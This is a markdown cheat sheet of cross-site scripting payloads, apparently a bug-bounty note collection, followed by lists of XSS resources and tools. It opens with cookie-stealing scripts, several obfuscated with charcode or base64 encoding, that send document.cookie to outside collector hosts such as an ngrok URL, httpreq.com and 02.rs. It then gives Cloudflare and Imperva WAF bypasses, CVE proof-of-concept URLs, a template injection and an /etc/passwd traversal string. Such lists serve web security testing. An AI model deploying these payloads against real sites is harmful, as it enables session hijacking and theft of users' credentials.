# XSS Summary
- [XSS Payloads Examples](#XSS-payloads-examples.)
- [XSS Resources](#XSS-Resources)
	- [XSS-Tools](#XSS-Tools)


## XSS payloads examples.

### XSS Cookie steal

```js
<script>document.write('<img src="https://httpreq.com/asd/ecord?cmd='+document.cookie+'"witdh=0 hight=0 border=0 />');</script>
```
```js
<script>document.write('<img src="http://asdasd.ngrok.io?cmd='+document.cookie+'"witdh=0 hight=0 border=0 />');<script>
```
```js
<keygen autofocus onfocus=alert(1)>
```

### xss cookie steal encode with charcode 
```js
<keygen autofocus onfocus=(String.fromCharCode(100,111,99,117,109,101,110,116,46,119,114,105,116,101,40,39,60,105,109,103,32,115,114,99,61,34,104,116,116,112,115,58,47,47,104,116,116,112,114,101,113,46,99,111,109,47,111,100,100,45,108,101,97,102,45,121,100,101,49,102,117,55,112,47,114,101,99,111,114,100,63,99,109,100,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,43,39,34,119,105,116,100,104,61,48,32,104,105,103,104,116,61,48,32,98,111,114,100,101,114,61,48,32,47,62,39,41))>
```
```js
<script>location=atob("aHR0cDovLzE5Mi4xNjguMS4zL3oucGhwP3k9").concat(document.cookie)</script>
```
```js
<keygen autofocus onfocus=document.write(String.fromCharCode(39,60,105,109,103,32,115,114,99,61,34,104,116,116,112,115,58,47,47,104,116,116,112,114,101,113,46,99,111,109,47,111,100,100,45,108,101,97,102,45,121,100,101,49,102,117,55,112,47,114,101,99,111,114,100,63,99,109,100,61,39)+document.cookie+String.fromCharCode(39,34,119,105,116,100,104,61,48,32,104,105,103,104,116,61,48,32,98,111,114,100,101,114,61,48,32,47,62,39))/>
```

```js
<keygen autofocus onfocus=document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,34,104,116,116,112,115,58,47,47,104,116,116,112,114,101,113,46,99,111,109,47,111,100,100,45,108,101,97,102,45,121,100,101,49,102,117,55,112,47,114,101,99,111,114,100,63,99,109,100,61)+document.cookie(String.fromCharCode(119,105,116,100,104,61,48,32,104,105,103,104,116,61,48,32,98,111,114,100,101,114,61,48,32,47,62)))/>
```
```js
<keygen autofocus onfocus=a=document;a.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,39,104,116,116,112,115,58,47,47,98,99,53,57,98,97,56,49,98,48,52,100,49,97,57,97,57,100,53,101,99,51,49,49,98,49,56,56,97,49,55,55,46,109,46,112,105,112,101,100,114,101,97,109,46,110,101,116,63,116,101,115,116,61).concat(a.cookie).concat(String.fromCharCode(39,47,62))) />)/>
```
```js
<keygen autofocus onfocus=<script>location=atob("aHR0cHM6Ly9odHRwcmVxLmNvbS9vZGQtbGVhZi15ZGUxZnU3cC9yZWNvcmQ/Y21kPQ==").concat(document.cookie)</script> />
```
```js
<keygen autofocus onfocus=a=document;a.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,34,104,116,116,112,115,58,47,47,104,116,116,112,114,101,113,46,99,111,109,47,111,100,100,45,108,101,97,102,45,121,100,101,49,102,117,55,112,47,114,101,99,111,114,100,63,99,109,100,61).concat(a.cookie).concat(String.fromCharCode(34,47,62,10))) /> )/>
```
```js
<keygen autofocus onfocus=a=document;a.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,34,104,116,116,112,115,58,47,47,104,116,116,112,114,101,113,46,99,111,109,47,111,100,100,45,108,101,97,102,45,121,100,101,49,102,117,55,112,47,114,101,99,111,114,100,63,99,109,100,61).concat(a.cookie).concat(String.fromCharCode(34,47,62,10))) /> )/>
```
```js
<keygen autofocus onfocus=write(atob(&quot;PHNjcmlwdD50b3AubG9jYXRpb249Jy8vc2VuZC5oZXJlLm1lPycrZG9jdW1lbnQuY29va2llPC9zY3JpcHQ+&quot;))>
```
```js
title=cyberpunker&message=<button autofocus onfocus=write(atob(&quot;PHNjcmlwdD50b3AubG9jYXRpb249J2h0dHBzOi8vaHR0cHJlcS5jb20vb2RkLWxlYWYteWRlMWZ1N3AvcmVjb3JkP2NtZD0nK2RvY3VtZW50LmNvb2tpZTwvc2NyaXB0Pg==&quot;))>
```

### xxs

```js
//xss payloads

<a href=javas&#99;ript:alert(1)>
```
```js
<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
```
```js
<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
```
```js
//From Reflected XSS to RCE
Payload: "><img src=x onerror=alert(whoami)>
```

#### XSS Payloads

```js
"%3Cmarquee%3E%3C%2Fbr%3E%3C%2Fbr%3E%27%22%3E%22%3E%3Ciframe%3E%3Cimg%2Fsrc%2Fonerror%3Dalert%28document.domain%29%3E"
```

##### XSS Payloads - Escape Unicode Characters

```js
al\u0065rt(1)
```
```js
\u003Cscript\u003E
```
```js
al\u65rt
```

##### XSS Payloads - Bypass Cloudflare

```js
"><img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
```
```js
'"><script>alert`test`</script><img src=x onerror=alert`test`>
```
```js
<svg onx=() onload=(confirm)(1)>
```
```js
\">'>\"><img/src/onerror=confirm(document.cookie)>
```
```js
"><details/open/ontoggle=prompt("/test/")>
```
```js
<a"/onclick=(confirm)(document.cookie)>Click Here! 
```
```js
//Dec: 
<svg onload=prompt%26%230000000040document.domain)> 
```
```js
//Hex:
<svg onload=prompt%26%23x000000028;document.domain)>
```
```js
< svg on onload = ( alert ) ( document.domain ) > r " on onmouseover = ( alert ) ( document.domain ) // r * / eval ?. ( value % 2B / ( / . source ) // " > < input value = confirm autofocus onfocus = ' / * "
```
```js
<script> onerror=eval,new'\u{22}-alert\u{28}1\u{29}//' </script>
```
```js
//Dec:
<svg onload=prompt%26%230000000040document.domain)> 
```
```js
//Hex:
<svg onload=prompt%26%23x000000028;document.domain)>
```
```js
cookieStore.getAll().then(x=>fetch('//02.rs/'+JSON.stringify(x)))
```
```js
<div id=x></div> <script> Window.prototype.x.innerHTML='<img src=1 onerror=alert(1)>'; </script>
```
```js
Window.prototype.__proto__.x.ownerDocument.defaultView.alert(1)</script>
```
```js
java%0dscrip%0d%1b%1bt:console.log`${location=`https://www.test.com?c=${document.cookie}`}`
```
```js
x{}</style><xss style="animation-name:x" onanimationend="[].map(alert('xss'))"></xss>> 
```
```js
<b/style=position:fixed;top:0;left:0;font-size:200px>CSS<
```

### Imperva WAF bypass payload

```js
<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
```

### Ondblclick xss Payloads 

```js
<h1 ondblclick=alert`testXSS`>TESTXSS</h1>
```
```js
<marquee ondblclick=alert`testXSS`>TESTXSS</marquee>
```
```js
<xss ondblclick="alert`testXSS`" autofocus tabindex=1>testXSS</xss>
```
```js
<w="/x="y>"/ondblclick=`<`[confir\u006d`testXSS`]>z
```

### Alert Obfuscation

```js
t\u006fp[/al/.sourc\u0065+/ert/.sourc\u0065]``
//Top=t\u006fp
//source=sourc\u0065
```

### XSS payload 

```js
%3Cscript%3Efor((TESTXSS)in(self))eval(TESTXSS)(`${`TESTXSS`}`)%3C/script%3E
```

### A solid XSS payload that bypasses Imperva 

```js
<a/href="j%0A%0Davascript:{var{3:s,2:h,5:a,0:v,4:n,1:e}='earltv'}[self][0][v+a+e+s](e+s+v+h+n)(/infected/.source)" />click
```

### A cuneiform payload - blocked by CSP but shows the idea

```js
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
```

### HTML injection

```js
<font color="red">ERROR 1064 (42000): You have an error in your SQL syntax;
```

### HTML injection to XSS 

```js
//Query
<h1>TEST</h1> 
//if HTML isn't filtered in the result, then try adding, 
<h1 class="xxx" onmouseover=alert(document.domain)>Shop Now</h1>
```

### Directory traversal bypass double URL encoding 

```js
/../../etc/passwd   —   Got nothing?

//Try this:

%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Bug: XSS through file upload

```js
//Payload:
*/alert(1)</script><script>/ *
```
```js
// XSS in Jenzabar (CVE-2021-26723)
POC:
/ics?tool=search&query="><script>alert('xss')</script>
```

### Xss payload

```js
<script>Object.defineProperties(window, {xss: {value: {x: function() {return document.cookie}}}});alert(xss.x())</script>
```

### 4 XSS in FortiWeb (CVE-2021-22122)

```js
/error3?msg=30&data=';alert('xss');//
```
```js
/omni_success?cmdb_edit_path=");alert('xss');//
```

### When you find input field which allows " (quotes), try this payload:

```js
"autofocus onfocus=alert(1)// -> Doesn't work
```
```js
"type%3d"text"autofocus%20onfocus%3d"alert(1)" -> Works
```

### Vue.js Javascript Library Client-Side Template Injection cc 

```js 
//poc
hxxp://host/?name={{this.constructor.constructor('alert("foo")')()}}
```

### CloudFlare XSS Bypass 

```js
<svg onload=alert%26%230000000040"1")>
```
```js
# xss filter and got this interesting payload 
%ff<!---><svg/onload=top[/al/.source+/ert/.source]&lpar;)>
```

### xss

```js
img{background-image:url('javascript:alert()')}
```

### HTML injection or a triager claims you cant execute Open-Redirect inside a web-page without javascript, Use this payload 

```js
><meta http-equiv="Refresh" content="0; url='test.github.io'" />
```

### xss usando location.assign

```js
<svg onload=location.assign("javascript:alert`_Y000!_`");>
```

### XSS redteam, dirty security

```js
?age=25;location=/javascript:alert%25281%2529/.source; :>
```



## XSS Resources

- [portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) -  Cross-site scripting (XSS) cheat sheet
- [tinyxss.terjanq.me/](https://tinyxss.terjanq.me/) - tiny xss payloads.
- [github.com/hahwul/XSS-Payload-without-Anything](https://github.com/hahwul/XSS-Payload-without-Anything) - XSS Payload without Anything.
- [github.com/aemkei/katakana.js](https://github.com/aemkei/katakana.js) - XSS with katana characters
- [portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code](https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code) - XSS unicode


### XSS Tools

- [XSS tron](https://github.com/RenwaX23/XSSTRON) - Electron JS Browser To Find XSS Vulnerabilities Automatically.
- [XSS Finder](https://github.com/tegal1337/XSS-Finder) - Advanced Cross Site Scripting Software.
- [XSS Map](https://github.com/Jewel591/xssmap) - Detect XSS vulnerability in Web Applications
- [XXSer](https://github.com/epsylon/xsser) - Cross Site script is an automatic -framework- to detect, exploit and report XSS.
- [BXSS](https://github.com/ethicalhackingplayground/bxss) - Blind XSS 
- [SSTI- XSS Finder](https://github.com/darklotuskdb/SSTI-XSS-Finder) - XSS Finder Via SSTI
- [CyberChef encoding](https://gchq.github.io/CyberChef/#recipe=Escape_Unicode_Characters('%5C%5Cu',true,4,true)&input=JQCEH) - Encode unicode character with cyberchef.
